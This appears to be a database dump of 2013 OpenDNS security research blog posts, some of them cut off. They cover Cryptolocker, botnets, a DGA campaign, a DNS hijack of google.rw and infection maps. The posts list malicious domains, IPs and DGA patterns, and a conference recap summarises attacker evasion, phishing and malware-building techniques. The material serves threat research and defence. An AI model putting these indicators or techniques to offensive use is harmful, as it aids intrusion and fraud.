the same layout process.\nNOTE : The bright white color represent the reserved IP areas and the grey color represents the values that don’t have a continent or country code.\nRemarks / Interpretations :\nThe bright white color represents the reserved IP ranges :\n\n0.0.0.0/8 for broadcast messages\n10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 : Local communications within a private network\n127.0.0.0/8 : Loopback addresses\n240.0.0.0/4 : Reserved for future use\n255.255.255.255/32 : Reserved for limited broadcast\nEtc. For more details on the reserved address spaces : http://en.wikipedia.org/wiki/Reserved_IP_addresses\n\n\nSome continents occupy much bigger/smaller areas in the IP space than others.\nAsia (Yellow) and Europe (Light blue) split into dozens of countries from the continent to the country view.\nAfrica (green), South America (red) and Oceania (pink) are clearly less predominant in the IP space.\nWe can see the IP frontiers in isolated points. Some pink points (Oceania) inside the big yellow space (Asia) represent Indonesia and some yellow points in the light blue (Europe) area represent Eastern Europe.\nTo summarize, it is a well known fact that the IP distribution is obviously not uniform and we need to keep this crucial fact in mind to appreciate the next datasets.\nIP Infection maps\nNow let’s present a couple of infected IP sets gathered by the Research Team and let’s see some interpretations.\nThe first picture is the continent view, the second is the country view. Note that the color code is not necessarily the same in each country view.\n\n1. Cryptolocker (843 IPs)\nThis IP set is a list made by our researcher Ping of all the client IPs infected by the Cryptolocker ransomware in one single day (Oct 30th)\nFor more details on how Ping built this dataset, please click here.\n\nInterpretation\nThe infected clients are mostly located in North America and Europe. The first thing we notice is that the continent view and country view look pretty similar, in the global IP map (first picture of this blog), we can see that the big light blue range splits into many different countries which is interestingly not the case here since the ransomware has predominantly infected machines in the UK. And finally, we can see that the US was the most infected country.\n\n2. Weight Loss Scam (6049 IPs)\nThis IP set is a list our researcher Frank made of IP addresses hosting malicious content (Weight Loss Scam) taken from July 7th to today.\n\nInterpretation :\nHere we can clearly see a relatively strong presence in South America,  Africa. Given the small proportion they represent on the IP world map (First picture of this blog) the vivid green and red colors are noticeable. The machines are spread out in Europe and Asia have been infected  (Notice the light blue and yellow subdivision into many different colors in the country view) and also very present in the US.\n\n3. Kelihos (42244 IPs)\nThis IP set is a list made by our researcher Dhia representing all the client IPs infected by the Kelihos botnet.\nFor more details on how Dhia built this dataset, check out our Kelihos blog posts (1) and (2).\n\nThis one is clearly amazing. Since it contains more than 40,000 IPs, we would have expected a wide distribution but this is not the case here. This means the Kelihos botnet has infected a lot of sub networks and /16 prefixes. We notice a very strong presence in Europe, Asia and more precisely Eastern Europe (yellows in light blues). Almost nothing in Oceania (a single pink dot) and also a weak presence in the US (given the proportion of IPs it represents).\n\nConclusion\nTo conclude, we presented an interesting way to correlate geolocations and IP addresses of various datasets using some trigonometry and graphics knowledge. In further experiments, it would be interesting to use the colors to visualize something else (Ex : ASN, IP reputation score etc.). Also, since this layout is using only 2 dimensions, one way to improve it is to use the third dimension to represent other metrics (Ex : Traffic, DNS requests etc.).', 'Big Data;OpenGraphiti;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/11/18/internet-territories-introducing-ip-infection-maps/');

To better understand how  “Big Data” and “Predictive Analytics” are applied to cyber security at OpenDNS, let’s frame some parallels with two well-known services: Amazon and Pandora. We’ll look at how each service provider achieves their goals by using varying approaches to analyzing the varying data each acquires.\n\nA look back to the year 2000\nAmazon revolutionized recommendation systems for online shopping to get a leg up on their competitors, and to react faster to more data. It recognized that analyzing similar items based on user activity was more effective than analyzing similar users.\n“A good recommendation algorithm is scalable over very large customer bases and product catalogs, requires only subsecond processing time to generate online recommendations, is able to react immediately to changes in a user’s data, and makes compelling recommendations for all users regardless of the number of purchases and ratings.”\n—2003 Amazon report on recommendations\nPandora broke ground on the Music Genome Project to attract users with a better experience. It determined that analyzing which items were similar based on their characteristics was more effective than subjective user activity (note: thumbs up or down activity is kept separate per individual user).\nThe approaches were fundamentally different, but very effective in analyzing the amount of data each service acquired at the time. [click here for an approach comparison] Today, OpenDNS arguably acquires data at higher volumes and velocities, and has more demanding goals, than either Amazon or Pandora. [click here for a goal comparison] OpenDNS adopted aspects of both past approaches, but to make predictions before users performed any activity (versus reacting to activity), we needed a more advanced approach.\nA prelude to understanding the goals of OpenDNS\nIn the last decade, many industries have migrated to the cloud to offer more effective services by acquiring and analyzing better data than was ever possible on-premises – but not information security.\nMost vendors are still pushing security on-premises via network appliances or endpoint software, then collecting and reacting to malicious binary samples and copies of attacks, in addition to relying on static IP or file reputation systems. Currently, they’re doing this very quickly, at high volumes, and in part using the cloud – but it’s fundamentally the same approach. This resembles Pandora’s strategy, as vendors still employ large teams of security researchers to manually analyze threat (item) characteristics. It also mirrors Amazon, who requires at least one user to create some activity (i.e. download and execute the threat) so the service could then react to the new data. Due to the increased sophistication of advanced threats and overwhelming volume of commodity threats, traditional vendor analysis of incoming data has failed to keep up. The wrong way to stay ahead of cyber attackers is by relying on signatures and reputation to discover what threats look like or how they behave.\nPioneering a new cyber security approach to stay ahead of attacks\nIn 2012, OpenDNS hit the 50 million daily-active user milestone. And since launching in 2006, we’ve built the world’s largest Internet security network, which is deeply woven into the meshed fabric that holds together the Internet. It became apparent to us that we already had the right data—both the global intelligence and situational awareness—to uncover when and where cyber attacks are being staged on the Internet. All we needed were the right data analytics to extract such predictive power. The secret was to build multiple algorithmic classifiers, an approach which does in part parallel those of both Amazon and Pandora—but we had to go further. We applied machine learning systems to observe and adapt to constantly changing patterns, thus achieving the best possible predictive accuracy and coverage.\nAs a result, OpenDNS is predicting which sites will distribute malware, control botnets, or phish login credentials—before an attack happens! And we’re not done yet, so stay tuned for more news on how we’re helping enterprises stay ahead of cyber attackers.\n\n\n\nOpenDNS uses the power of data to provide unique security protection for our customers.

Three weeks ago, I attended BSides Raleigh and presented a fast predictive detection system for malware domains that leverages network reputation and our passive DNS database. This new system has helped mitigate several threats over the past few months, such as Fast flux botnet domains, Cryptolocker CnCs, Exploit kit domains, and other ransomware domains.\nAttending the conference\nIt was great to be a part of BSides Raleigh and spend some time in the city. All of the talks were very informative, and everyone showed a high level of knowledge and intellectual curiosity, which contributed to the success of the conference. Another memorable thing about the event was the very cool T-Shirt design:\n\nBefore I describe my presentation, let me go over some of the other great talks. In the opening session, Advanced Evasion Techniques—Pwning the Next Generation Security Products, David Kennedy described elaborate techniques to evade current enterprise security products. He discussed how to:\nProfile a target organization “without sending a single packet to them” (using social networks, Project Sonar shared data, search engines, etc).\nFind out what defensive capabilities they have in place.\nGet an attack around their preventive measures (e.g. next generation firewalls, web application firewalls, application whitelisting, IDS, vulnerability assessment tools, SIEM, AV, egress filtering, etc.).\nDave kept his presentation interesting with fascinating live demos of the tools he uses:\nTorpedo (a tool that he wrote but has not released yet) used with Burp to profile Web Application Firewalls.\nRecon-ng used with jigsaw.com, for organization reconnaissance and info gathering (there is a tool for enumerating information about a company’s employees also called jigsaw).\nThe harvester: another info gathering tool (part of Backtrack) used for instance to elicit email naming schemes of target organizations.\nThe Social Engineer Toolkit (SET).\n\nDave also discussed how to craft targeted emails that trigger emotional responses in their recipients in order to penetrate the organization via social engineering. He described how to clone a site to harvest username/passwords and how to obfuscate and sign the attached payloads using a throw-away certificate to abuse trust and get the victim to run the payload.\nIn Malware Automation, Chris Elisan discussed the current state of malware, and described the tools an attacker can use to automatically build an army of armored malware. This arsenal consists of:\nDiY kits (ex: SpyEye, Zeus); kits that can generate an infinite number of malware samples.\nArmoring tools (that use time and date to generate a nearly infinite number of samples).\n\nPackers (e.g. UPX).\nCrypters (e.g. PFE CX, or online services such as indetectables.net).\nJoiners/binders.\n\n\nAV-scanners for quality assurance purposes (on-premise, or in the cloud).\nChris demo’ed the Zeus Crimeware kit and the Saw crypter and showed how they can generate new unique malware samples en masse, and on the fly.\nIn Bending and Twisting Networks, Paul Coggin went over various advanced strategies and techniques to attack/penetrate network infrastructures, monitor, and exfiltrate data flows. These methods exploit protocols, device features, and network trust relationships (e.g. SNMP, IP routing policies, GRE tunnels, ERSPAN, DLSw, L2TP, Lawful intercept feature, OSPF, BGP, etc). Paul also discussed several approaches to mitigate these attack vectors.\nMy presentation\nWhen it was my turn, I discussed a predictive fast detection system of malware domains that I built leveraging network reputation and our DNS database (DNSDB). The slides of the talk are available here.\n\nThis system consists of two components:\nAn IP reputation component that carefully builds a watchlist of high risk IPs to monitor, and\nA detection component that performs inverse lookups against the DNSDB to instantly detect new malicious domains that resolve to the IPs in the watchlist.\nBoth components run on a constant basis. Furthermore, in the background, the DNSDB is also constantly fed with the authoritative traffic coming from our resolvers. This traffic is first cleaned and deduplicated, then added to the indexed DNSDB.\nOver the past months, this system has been monitoring and detecting several threats such as:\nDomains serving various Exploit kits: BlackHole, Neutrino, NuclearPack, Angler, Magnitude, Styx, etc.\nCnC domains for trojans such as Sality, Caphaw.\nCnC domains for ransomware such as CryptoLocker, Reveton, Urausy.\nDomains serving browser-based ransomware (browlock).\nEarly detection of initial Cryptolocker CnC domains\n\nCryptolocker, the now infamous ransomware, emerged in early September of this year. The very first two CnCs spotted in the wild (xeogrhxquuubt,com and qaaepodedahnslq,org) were picked up by our detection system as soon as they hit our traffic and a few hours before they were published in the security community. We think that this ensured the initial low infection rate for Umbrella users. We further used other models to track down Cryptolocker DGA CnCs and mitigate the threat for our customers.\nPredicting the emergence of Exploit kit and malware domains\nThe detection system also regularly helps predict patterns of how malicious domains use the network infrastructure.\nOne example was NuclearPack domains that were initially spotted on 142.4.194.0 on Oct 28th [details here]. We predicted that the Exploit kit domains would soon shift to the next IPs, and that was confirmed the next day [details here].\nWe also used the system to spot a malware campaign in its early stage: we discovered on Nov 1st that an initial range of 55 IPs in the range 62.122.73.200-254 were all loaded with rogue software payloads, and only 8 IPs were hosting live domains at the moment of discovery. We predicted that new domains would emerge on the remaining IPs [details here]. This has been confirmed, and currently there are 22 IPs hosting domains and serving the malware payloads. The campaign is still ongoing—we predict the full range of 55 IPs to be used for domain hosting and malware serving.\nConclusion\nSecurity is a complex endeavor, and the various talks at BSides Raleigh showed once more that different layers and strategies must be deployed to protect valuable assets of the individual and enterprise alike. The human element is also important, as a lot of current attacks combine social engineering with technical exploitation.\nThis new predictive detection system for malware domains is an early detection layer in a defense-in-depth approach to security. It’s now a key part of the arsenal of models we use to detect malicious domains at the earliest stage so we can protect our customers from the avalanche of online threats.', 'Big Data;Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/11/07/fast-predictive-detection-malware-domains-new-system-presented-bsides-raleigh/');

To address these botnet threats, OpenDNS blocks the malware’s ability to communicate with the command and control server and prevents it from getting encryption keys, updates, or attack instructions. This cripples the malware and prevents it from causing harm while giving IT valuable time to address the issue.\nSagiss, one of our valued Managed Service Provider (MSP) partners recently told us a real-world story of how OpenDNS contained Cryptolocker, a piece of ransomware. Sagiss is one of the world’s top 100 MSPs (MSPMentor 100) and has been delivering proactive IT for thousands of users in Dallas, Fort Worth, and the Mid Cities since 1992. Sagiss has been using OpenDNS to protect their customers for over 3 years, and CTO Jim Lancaster tells us of a recent event where, “OpenDNS saved our bacon.”\n“Anti-Virus was deployed, updated, and functioning normally last week when one of our customers received what looked like an internal email indicating she had received a voicemail message,” Jim explains. “She clicked on the voice-mail attachment and when nothing happened, she forwarded to it to the office admin to figure why she couldn’t play it and promptly forgot about it. Then, OpenDNS detected a sudden spike in blocked botnet activity so we proactively reached out to the customer to investigate.”\nLancaster had his team take a closer look at the computers that had OpenDNS blocked botnet queries. “We discovered that her laptop was, in fact, infected with CryptoLocker, but the threat was contained and we were able to easily clean it before it encrypted any files.  A second infected machine turned out to be a personal machine owned by the office admin. When she had received the forwarded voice-mail message, she tried to be helpful and open the attachment to see if it would play.”\nThe fake voicemail attachment is an example of how hackers use social engineering to infect users. Thanks to OpenDNS, however, the infection was contained.  “We swept the network and found no other trace of CryptoLocker and, most importantly, no encrypted files.”  By containing the infection with OpenDNS, the Sagiss team was able to avoid any customer impact and remove the infection in just a few minutes instead of facing a choice of paying a ransom or spending many hours restoring the computer from backup.\nLearn how Umbrella for MSPs can help keep your customer’s networks and devices safe from infections.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1607, 'Two Months Later, Cryptolocker remains at large', 'OpenDNS Security Research', 'November 5, 2013', 'Cryptolocker was first spotted in the wild as early as the first week of September. By the end of October, it had been named one of the “Internet’s Most Wanted” by all major security vendors. By now, the Internet has covered what it is, how one gets infected, how to remove it, and how to avoid being infected. Unfortunately, there’s no way to decrypt the files without the crypto key (see why here). The best prevention as of now is to prevent the malware from executing in a Windows system with SRP (software restriction policy).\nThis malware has received some serious attention from the security community for nearly two months, so we’re curious about the effectiveness of these defense measures and the impact to OpenDNS customers.\nFirst, a quick recap of how OpenDNS provides protection against Cryptolocker: In a previous post, we introduced a predictive algorithmic method – The Ripple Effect – for detecting Cryptolocker CnC domains. The method uses the fact that the malware contacts a set of randomly generated domains to fetch an asymmetric crypto key before it starts encrypting the data files on the victim’s system. The Ripple Effect method relies on the co-occurring pattern of the domain requests made consecutively by the malware in a short time window.\nA number of users of our free DNS service were infected with the malware (we’ll show some simple stats later on). OpenDNS customers using Umbrella are protected against losing their valuable data to Cryptolocker because we successfully cut off the outbound communication initiated by the malware for retrieving the encryption key. OpenDNS customers are spared the data loss, and gain time to remove the malware before it can cause damage.\nIf you’re an Umbrella user, you can check for evidence of Cryptolocker in the Dashboard. On the Security Activity report, filter by security category: botnet.  There is a very good chance of you were infected by Cryptolocker if you see a long list of botnet domains displaying the following patterns:\n12,13,14 or 15 random characters, TLDs rotating among .info, .com, .ru, .biz, . co.uk, .org and .net\nFrequent requests made in very short intervals to about 1000 unique domains following the above string patterns.\nIf that is what you’re currently seeing in your network, be sure to check for Cryptolocker infection and clean it up as soon as possible. Cleaning the malware is rather straightforward.\n\nThe following traffic frequency chart shows that the life span of each Croptolocker domain is exactly 24 hours.\n\nHow widespread is the infection? We looked into our data for October and studied the infections among OpenDNS users in a number of dimensions. We first took a look at the number of total requests made to Cryptolocker domains over the last two weeks of October: a daily rate of a few millions.\n\nThe insane volume of requests is due to the non-stop, repeated requests of a single copy of the malware when it fails to make contact with its CnC servers and there are 1000 domains being requested each day. The total number of user clients initiating these requests is on a much smaller scale, but certainly large enough to make the malware authors a sizable profit if all Cryptolocker victims pay the ransom.\nIn the following figure, we show the count of total infections (by unique client IP addresses) each day, and the count of new infections.\n\nThe infected clients spread over multiple countries, and clearly have a higher concentration in the U.S.\n\nEven though many of the Cryptolocker domains were sinkholed, the bad news is that a single successful contact with the CnC server will lock down your data files. We observed the CnC servers resolutions over 30 days, and the following chart shows the number of CnC servers successfully resolved to a non-sinkholed IP address.\n\nLet’s take a closer look at the infrastructure of the CnC server IP addresses. This chart shows how IP addresses were rotated in and out at different days, and the height of each segment shows the number of domains mapped to an IP address on a particular day.\n\nThese IP addresses are located in a variety of geolocations.\n\nRight now, Umbrella effectively contains the current version of Cryptolocker, but we don’t expect to this notorious ransomware  to reach a full stop any time soon.  We are very closely tracking the progression of its infrastructure changes and likely new malware variations.

But we detected it and helped to fix it so quickly, few people even noticed.\nBecause these attacks seem to be gaining in frequency, we built a system to monitor the records large set of popular domain names. We wrote massresolver, a simple tool leveraging libunbound to quickly and securely resolve a massive list of domain names, even with an empty cache.\nNow, each time an unexpected name server is detected for a domain in the output, an email is sent to our team, and we can immediately take action to protect our users.\nWe don’t provide authoritative DNS services, so we can’t prevent changes to the actual records hosted on name servers, but we can prevent Umbrella users worldwide from being directed to the malicious IPs via our recursive DNS services.\nLast night, our monitoring system fired up an alert: the google.rw name servers were not Google’s any more. They were served by a free hosting service named 000webhost.\nWe saw the same name servers a couple days ago: these were used by the Syrian Electronic Army when they took control of the .qa (Qatar) zone, and redirected a lot of domains to their own servers in order to spread a political message.\nEach DNS record has a time-to-live, i.e. the minimum amount of time resolvers should cache it and serve it unmodified to clients before asking for an update. The attackers wanted to take advantage of this: they set up an unusually high time-to-live for the malicious IP. The very same TTL was observed last week during the .qa zone hijack by the Syrian Electronic Army. Can you spot the malicious IP among Google’s legitimate ones?\n\nBecause the hackers chose a free hosting service that couldn’t keep up with the amount of queries received for google.rw, we couldn’t see if the hackers had posted a message or were serving malware. We did, however, immediately block the related IP addresses.\nWe detected the hijacking less than 5 minutes after the records had been changed and before any of our resolvers had any chance to fetch the malicious records.\nAround the same time, we tweeted about this event:\n\nStephane Bortzmeyer of the .FR registry immediately saw the tweet and jumped on his phone to contact the .RW registry.\n\n10 minutes later, the .RW registry acknowledged the hack, and restored the original DNS records.\nIn just 10 minutes, this name server hijack against Google was defeated even before the attackers started to brag about their achievement. Thanks to our monitoring systems, and to very reactive friends!\nThese kinds of attacks are very powerful. Even if a Web site is extremely secure, the content that users load also depends on name server records whose security depends on a third-party. Nothing happened to the servers of the targeted companies, but attackers were able to change DNS records so that users accessing these domains were redirected to a totally different set of machines. Furthermore, controlling a domain name also allows attackers to potentially read private email sent to this domain.\nEvery time we notice a major name server hijack, we immediately block the relevant IP addresses, if only to prevent our users from sending emails that would be intercepted by attackers. With our new monitoring tool, we’re making sure that our users will be protected from these hijacks before they have time to notice.', 'Security Community;Security Research', 'https://umbrella.cisco.com/blog/2013/10/25/google-rw-hijack-nobody-else-noticed/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1610, 'Finding the Patterns in a Mysterious New DGA', 'Dhia Mahjoub', 'October 24, 2013', 'For the past two weeks, since Oct 9th, we’ve observed a high volume of periodic nxdomain lookups in our DNS traffic to a number of Domain Generation Algorithm (DGA) domains. In investigating these domains we found a few curious patterns in when and how they seemed to appear.\nA DGA  is a technique that uses a random or dynamic component in its logic to generate domain names. This component can be a random number or the current time, and combined with alphanumeric characters, the algorithm will generate a new different domain name in every iteration. DGA domain names are typically generated by certain malware families to contact their CnCs as a scheme against domain or IP blocking of the malware CnCs, or to prevent the domains from being as easily identified  as if they were hardcoded in the malware. However, not all DGA-like domains are necessarily malware related. For example, Chrome connects at startup to random domains to determine if you’re currently on a network that intercepts and redirects requests for nonexistent hostnames [1]. Or a seemingly random domain could be used as a form of DNS-tunneling where a request is encoded in the domain name, and depending on the DNS query type, a specific response is sent back to the client [2].\nIn this case, the 12 DGA domains we’re investigating do seem to be part of some suspicious activity. These are the first domains that we noticed:\neqxowsn.info\nggegtugh.info\nhquterpacw.net\noumaac.com\nqfiadxb.net\nrwyoehbkhdhb.info\nrzziyf.info\nvmlbhdvtjrn.org\nyeiesmomgeso.org\nyeuqik.com\nyfewtvnpdk.info\nzffezlkgfnox.net\nTake a look at the daily periodic traffic to zffezlkgfnox.net across all data centers:\n\nDaily DGA domains\nWhile the traffic to these 12 domains was ongoing, on Oct 16th we observed the emergence of about 570+ related DGA domains that received lookups during the entire 24 hours of the day before dropping to no activity. On each of the following days, from Oct 17th to Oct 21st, we saw about 2100+ DGA domains display the same traffic pattern of constant lookups lasting exactly 24 hours then complete drop. Each day, there was a completely new set of DGA domains, and all of these lookups were nxdomains, except for a handful of resolving domains that we will discuss later.\nIn total, we saw 12000+ unique DGA domains in our DNS traffic over a period of 2 weeks. Then, suddenly around 12am on Oct 22nd, traffic to all of these domains stopped. For the present moment, no new related DGA domains have been observed. Below we show the traffic pattern of one of these daily domains along with the daily DGA domains counts.\n\n\n\n\nDGAs are all related\nAll of these domains are linked together via the related domains model, meaning they are looked up by the same set of client IPs during a short time period. Assuming these DGAs are malicious, this is an indication that they are likely generated by a single or similar malware samples. To discover the set of 12000+ domains, we start from a seed DGA domain as the root then traverse the graph of related domains over a very high number of hops away from the root. Since it is very likely that non-DGA legitimate popular sites (for example we observed dropbox.com, hulu.com, cnn.com, etc) could be looked up during the same time frame as the DGA domains, they might end up in the related domains set of traversed nodes. After careful empirical verification to make sure we are catching DGA domains that fit in our target set, we only keep domains that meet a certain traffic profile. This profile corresponds to a specific volume of traffic that spans only 24 hours. This filtering heuristic turns out to be efficient as no false positives were observed. Below we can see a sample of related domains as displayed by the Security Graph web interface and also the visualization engine. The related domains is close to the co-occurences model that we used before [3][4]\n\n\n\n\nIn the meantime, on Oct 19th, João Gouveia from AnubisNetworks’ research lab (@jgouv) tweeted about a new DGA lookalike set of domains that he saw rising in traffic and that was quite active in Brazil. He also posted a screenshot of a sample DGA domains which happened to correspond to the same domains seen in our traffic.\n\nWorldwide DGA DNS traffic\nOn the map below, we show the worldwide volume of DNS traffic to a sample of DGA domains recorded on Oct 18th. From this daily sample, we see that the top 10 countries generating traffic to these DGA domains are Turkey, Bulgaria, Brazil, Russia, Italy, India, Vietnam, Lithuania, United States, and Poland. It is interesting to see the heavy traffic volume coming from Turkey compared to other countries.\n\n\nDomain name analysis\nBased on the sample set, all of these DGA domains consist of 1 single label and fall under 4 TLDs: info, net, org and com. Below we can see the domains’ TLD distribution.\n\n\nEvery domain label is a random lowercase alphabetic string with a length between 6 and 12 characters. Below we can see the labels’ length distribution and the labels’ character frequency distribution of the entire dataset of 12000+ DGA domains.\n\n\n\nIt seems from the dataset that all lengths of the labels are more or less equally likely. We also observe from the character frequency graph that all letters of the alphabet are used in generating the domains’ labels, and it is interesting to see how the frequency alternates between consecutive letters in the alphabet. In other words, if we index the alphabet letters into an array starting from index 0. Letters with even indices (0,2,4,6, etc) have all about the same frequency and letters with odd indices (1,3,4,5, etc) also have approximately the same frequency.\nThis gives a few hints on how the DGA algorithm operates, suggesting patterns in how the set of domains is created. In addition, the time component comes into play since a new distinct set of DGA domains is generated every day.\nResolving DGA domains\nAll the 12000+ DGA domains are nxdomains except for 5 domains that resolve:\ncomiss.com 107.20.206.69 10800\nmcscwi.org 54.246.158.32 86400\noumaac.com 141.8.224.183 300\nqqmiao.com 198.58.102.106 600\nyousuo.com 65.19.157.194 86400\nLet’s go over some OSINT gathered about these domains and IPs.\ncomiss.com is a parked domain hosted on a parking IP 107.20.206.69. The IP is currently associated with dropping FakeAV [VirusTotal report]\nmcscwi.org was registered on Feb 12th, 2013, and seems to belong to the “Milwaukee Community Service Corps”. It resolves to a shared hosting IP 54.246.158.32.\noumaac.com is also a parked domain that resolves to a parking IP 141.8.224.183. This IP is currently associated with dropping trojan worms [VirusTotal report]\nqqmiao.com resolves to a SoftLayer shared hosting IP 198.58.102.106. There is no known public record of malicious activity on this IP.\nyousuo.com is a parked domain that resolves to a parking IP 65.19.157.194. This IP has been associated with dropping trojans [VirusTotal report]\nConclusion\nIn conclusion, this is a rather odd DGA campaign that lasted for more than two weeks with 12 domains, rose to 12000+ domains within less than a week, then suddenly stopped. There is no confirmation yet of its maliciousness as we are not aware at the time of this writing of the actual sample generating these domains. All of these domains have been blocked as a preemptive protection measure for our customers, and we will keep a close eye on this phenomenon and report any new findings.', 'Big Data;Security Graph;Security Research', 'https://umbrella.cisco.com/blog/2013/10/24/mysterious-dga-lets-investigate-sgraph/');

Three other domains are using the same fastflux network—consider them part of the same gang.\n\n\nThese domains and associated domains were blocked for OpenDNS customers since the phish/malware campaign first broke out on Oct 18th, so our users can rest assured that they are safe.', 'Security Community;Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/10/21/dropbox-phish-spreads-zeus-trojan/');

Modern systems include billions of elements and in most cases users can add, delete, and modify items at any time. And because the data is decentralized, it can be pretty tricky to make sure we’re looking at an up-to-date version of the system. Last but not least, in many situations, we are interested in not only visualizing the current system, but also the evolution of that system over time. Depending on how the databases are built and how the various modifications are stored, this task can become extremely complex in terms of memory usage, processing time and data consistency.\nFurthermore, what about the visualization perspective? How do we choose a layout that works for our needs? That is, how do we design a visualization technique that will be able to represent a structure constantly evolving over time?\nOf course, we can’t answer those questions all at once; in this article we will focus on one part of the problem. We propose an idea that will help us form a visual representation of a general data flow inside a graph model. The basic idea is very simple indeed: each graph edge has an “Activity” attribute defined as a float value.\nThen we setup a particle system to make small textures fly from the first edge node to the second one. Finally we use the “Activity” value to set the speed of each edge particle.\nThe result is an interactive representation of the activity of the whole system we want to monitor, giving us an easy way to spot the features of the global data flow.\nDepending on the system we are trying to monitor, this can be applied to many different problematics:\nNetwork traffic\nChat communication inside a social network\nUsers page transitions in a web site (Markov chain analysis)\nAverage path in a tree / graph (Decision tree monitoring)\nAnd many others…\nDemo: A network activity simulation\nToday we present a real-time simulation in WebGL showing a global edge activity in a graph model. For demonstration purposes, the data set and activity are randomized to illustrate the proof of concept.\nControls\nHit play/pause to control the animation\nNavigate with the mouse and arrows (FPS view)\nDouble-click on a node to zoom in and switch to a spherical view.\nClick on an empty area to go back to standard FPS view. \nSwitch through the different layout modes in the menu.\nDrag and drop nodes with the mouse to play with the physics engine.\nClick here to view the animation\n\nA bigger dataset in action\nOf course, this article wouldn’t be complete without a concrete application on our Security Graph.\nHere is what the same process looks like on a related domain graph extracted from a given domain.To put it in a nutshell, when two domains are requested within a small time frame (1 second), we add a “related domain” link between them. This helps us understand which actors and services are at play when we access a given domain.\nFor example, here are the “www.youtube.com” related domains (click to enlarge):\nYou may also notice that we count each related domain appearance. We can then calculate a normalized probability which we use to set the edge activity. In other words, it is like visualizing the markov chain of the related domains.\n(These are gif animations. Click on them to open a new tab.)\nThis is what it looks like on a graph containing 1,455 nodes and 2,187 edges.\n\nAnd the same result on a bigger graph: 11,779 nodes, 16,470 edges.\n\nConclusion\nIn conclusion, monitoring a dynamic system leads to many new challenges, and not only in terms of graph activity. It opens the door to several new approaches and brings a lot of fresh questions. We’ll take a closer look at questions like these in the weeks to come:\nHow do we extract the global state of the graph activity?\nWhat patterns can we find to help us improve the graph state?\nAnd last but not least, how do we monitor and apply automatic retro-action on the system?', 'Big Data;Security Research', 'https://umbrella.cisco.com/blog/2013/10/16/data-movement-deeper-look-complex-state-machine/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1614, 'Investigating a New Botnet with the Security Graph', 'Dhia Mahjoub', 'October 14, 2013', 'Last Wednesday morning, João Gouveia from AnubisNetworks’ research lab (@jgouv) tweeted about a new large botnet he spotted and posted a great blog describing the early stages of this botnet’s spread that he dubbed UnknownDGA17.\nAccording to Gouveia, the botnet spread at a rapid pace to infect 150,000 devices within hours. He also showed that “a total of 21 different domain names were being used at the time of the initial analysis” as CnCs. AnubisNetworks promptly sinkholed these domains to monitor the evolution of the infection. Gouveia revealed that the 21 domains were all registered under the .su ccTLD but did not disclose the full domain names.\nThe first CnC\nAs the workday started, I was curious to see what information OpenDNS traffic data could tell us about this botnet and if the Security Graph could help us find more. I was not disappointed. First, by checking our authoritative DNS traffic of Oct 9th for all .su domains, it was possible to spot an initial CnC. Thankfully, that initial CnC was already blocked by our team. A few hours after his first tweet, I replied to @jgouv that OpenDNS also saw a surge in traffic to one of the .su CnC domains.\n\n\nThe remaining CnCs\nNext, it was important to see if we could find the other related CnC domains using the co-occurrences model. Co-occurrence is a very effective investigative model that we regularly use in gathering intelligence about all kinds of threats [1][2]. Applying the model to the initial CnC domain, it was possible to discover all the remaining 20 .su domains as can be seen on the Security Graph screenshot below.\n\nIn order to protect our customers, we blocked all 21 CnC domains as soon as they were discovered, and we will continue to monitor this threat. For example, we can see in the screenshot below that traffic to the CnCs remains high.\n\nIn the screenshot below, we can see how the Security Graph can also help visually spot co-occurring or related domains by starting from an initial domain and expanding to the other vertices in the co-occurrences graph.\n\n\nWorldwide Botnet Spread\nOn the map below, we show the worldwide volume of DNS traffic to these 21 CnC domains that we recorded on Oct 9th. From this daily sample, we see that the top 10 countries generating traffic to the botnet CnCs are Vietnam, Algeria, Turkey, Brazil, Venezuela, Indonesia, France, Russia, India, and Italy.\n\ngoogle.load(\'visualization\', \'1\', {packages: [\'geomap\']});\nfunction drawVisualization() {\r\n    // Create and populate the data table.\r\n    var data = new

curious to see if any of the infected IPs looking up the new botnet’s CnCs were tied to the Kelihos botnet, another botnet we’ve been monitoring for some time [3][4]. It came as no surprise that a few infected client IPs that were phoning to UnknownDGA17’s CnCs were also part of the Kelihos botnet. These IPs  were located in Ukraine, Vietnam, and India and have hosted known (now defunct) fast flux Kelihos domains: syqholu.com, and widerat.com. This demonstrates once again that botnets often have overlapping sets of victims either by using each others’ infrastructures, or by indistinguishably infecting machines on a large scale with as many malware families as possible. We saw this recently when we showed that ZeroAccess supernodes can also be part of the Kelihos botnet [5], and we’ll continue investigating this phenomenon in the future.', 'Security Community;Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/10/14/investigating-new-botnet-security-graph/');

No matter how effective—or expensive—the security tools protecting your network are, there’s no way to predict the damage caused by a single careless user. The war against cyber criminals is fought each time a user decides to click an unfamiliar link or open an attachment—and just a single mistake could be the reason for massive data loss.\nTo help out IT security managers during this Cyber Security Awareness Month, we’ve compiled a list of things your users should be thinking about whenever they’re using the Internet. They’ve probably heard many or all of these tips before, but repetition doesn’t spoil the prayer. If you take security seriously, you’re already using Umbrella by OpenDNS to protect your network from malware, botnets, and other advanced threats. And if you’re smart, you know that there’s no substitute for educating your users. Share this list with your users, this month—and every month.\nRead our Top Ten Cyber Security Tips below, then be sure to check out our in-depth strategy sheet here.\nRealize that you are an attractive target to hackers. Don’t ever say “It won’t happen to me.”\n\n\nPractice good password management. Use a strong mix of characters, and don’t use the same password for multiple sites. Don’t share your password with others, don’t write it down, and definitely don’t write it on a post-it note attached to your monitor.\n\n\nNever leave your devices unattended. If you need to leave your computer, phone, or tablet for any length of time—no matter how short—lock it up so no one can use it while you’re gone. If you keep sensitive information on a flash drive or external hard drive, make sure to lock it up as well.\n\n\nAlways be careful when clicking on attachments or links in email. If it’s unexpected or suspicious for any reason, don’t click on it. Double check the URL of the website the link takes you to: bad actors will often take advantage of spelling mistakes to direct you to a harmful domain. Think you can spot a phony website? Try our Phishing Quiz.\n\n\nSensitive browsing, such as banking or shopping, should only be done on a device that belongs to you, on a network that you trust. Whether it’s a friend’s phone, a public computer, or a cafe’s free 